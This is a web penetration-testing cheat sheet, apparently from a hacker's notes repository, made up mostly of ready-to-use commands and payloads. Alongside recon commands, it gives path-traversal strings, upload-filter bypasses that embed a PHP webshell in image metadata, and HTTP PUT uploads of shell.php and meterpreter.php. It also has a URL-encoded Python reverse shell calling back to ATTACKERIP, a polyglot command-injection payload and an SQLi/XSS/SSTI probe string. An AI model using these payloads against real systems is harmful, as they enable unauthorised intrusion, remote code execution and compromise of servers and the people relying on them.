# Quick tricks

```bash
# Web ports for nmap
80,81,300,443,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8083,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,11371,12443,16080,18091,18092,20720,55672

# Technology scanner
# https://github.com/urbanadventurer/WhatWeb
whatweb htttps://url.com

# Screenshot web
# https://github.com/maaaaz/webscreenshot
# https://github.com/sensepost/gowitness
# https://github.com/michenriksen/aquatone

# Get error with in input
%E2%A0%80%0A%E2%A0%80

# Retrieve additional info:
/favicon.ico/..%2f
/lol.png%23
/../../../
?debug=1
/server-status
/files/..%2f..%2f

# Change default header to accept */*
Accept: application/json, text/javascript, */*; q=0.01

# Sitemap to wordlist (httpie)
http https://target.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g' > wordlist_endpoints.txt

# Bypass Rate Limits:
# Use different params: 
    sign-up, Sign-up, SignUp
# Null byte on params:
    %00, %0d%0a, %09, %0C, %20, %0

# Bypass upload restrictions:
# Change extension: .pHp3 or pHp3.jpg
# Modify mimetype: Content-type: image/jpeg
# Bypass getimagesize(): exiftool -Comment='"; system($_GET['cmd']); ?>' file.jpg
# Add gif header: GIF89a;
# All at the same time.

# ImageTragic (memory leaks in gif preview)
# https://github.com/neex/gifoeb
./gifoeb gen 512x512 dump.gif
# Upload dump.gif multiple times, check if preview changes.
# Check docs for exploiting

# If upload from web is allowed or :
# https://medium.com/@shahjerry33/pixel-that-steals-data-im-invisible-3c938d4c3888
# https://iplogger.org/invisible/
# https://iplogger.org/15bZ87

# Check HTTP options:
# Check if it is possible to upload
curl -v -k -X OPTIONS https://10.11.1.111/
# If put enabled, upload:
curl -v -X PUT -d '' http://10.11.1.111/test/shell.php
nmap -p 80 192.168.1.124 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'
curl -v -X PUT -d '' http://VICTIMIP/test/cmd.php && http://VICTIMIP/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22ATTACKERIP%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
curl -i -X PUT -H “Content-Type: text/plain; charset=utf-8” -d “/root/Desktop/meterpreter.php” http://VICTIMIP:8585/uploads/meterpreter.php
# If PUT is not allowed, try to override:
X-HTTP-Method-Override: PUT
X-Method-Override: PUT

# Retrieve endpoints
# LinkFinder
# https://github.com/GerbenJavado/LinkFinder
python linkfinder.py -i https://example.com -d
python linkfinder.py -i burpfile -b

# Retreive hidden parameters
# Tools
# https://github.com/s0md3v/Arjun
python3 arjun.py -u https://url.com --get 
python3 arjun.py -u https://url.com --post
# https://github.com/maK-/parameth
python parameth.py -u https://example.com/test.php
# https://github.com/devanshbatham/ParamSpider
python3 paramspider.py --domain example.com
# https://github.com/s0md3v/Parth
python3 parth.py -t example.com

# .DS_Store files?
# https://github.com/gehaxelt/Python-dsstore
python main.py samples/.DS_Store.ctf

# Polyglot RCE payload
1;sleep${IFS}9;#${IFS}’;sleep${IFS}9;#${IFS}”;sleep${IFS}9;#${IFS}

# Nmap web scan
nmap --script "http-*" example.com -p 443

# SQLi + XSS + SSTI
'"><svg/onload=prompt(5);>{{7*7}}
' ==> for Sql injection 
"><svg/onload=prompt(5);> ==> for XSS 
{{7*7}} ==> for SSTI/CSTI

# Try to connect with netcat to port 80
nc -v host 80

# Understand URL params with unfurl
https://dfir.blog/unfurl/
```

